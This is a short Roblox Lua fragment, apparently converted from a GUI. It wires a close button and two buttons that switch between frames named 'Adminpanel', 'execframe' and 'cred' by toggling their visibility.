-- Scripts:

local function QERYL_script() -- x.LocalScript 
	local script = Instance.new('LocalScript', x)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(QERYL_script)()
local function VTED_script() -- admin.LocalScript 
	local script = Instance.new('LocalScript', admin)

	script.Parent.MouseButton1Click:Connect(function()
		local parent = script.Parent.Parent
		if not parent then return end  
	
		if parent:FindFirstChild("Adminpanel") then
			parent.Adminpanel.Visible = true
		end
	
		if parent:FindFirstChild("execframe") and parent.execframe.Visible then
			parent.execframe.Visible = false
		end
	
		if parent:FindFirstChild("cred") and parent.cred.Visible then
			parent.cred.Visible = false
		end
	end)
	
end
coroutine.wrap(VTED_script)()
local function HFIMFC_script() -- Credits.LocalScript 
	local script = Instance.new('LocalScript', Credits)

	script.Parent.MouseButton1Click:Connect(function()
		local parent = script.Parent.Parent
		if not parent then return end  
	
		if parent:FindFirstChild("cred") then
			parent.cred.Visible = true
		end
	
		if parent:FindFirstChild("Adminpanel") and parent.Adminpanel.Visible then
			parent.Adminpanel.Visible = false
		end
	
		if parent:FindFirstChild("execframe") and parent.execframe.Visible then
			parent.execframe.Visible = false
		end
	end)
	
end
coroutine.wrap(HFIMFC_script)()
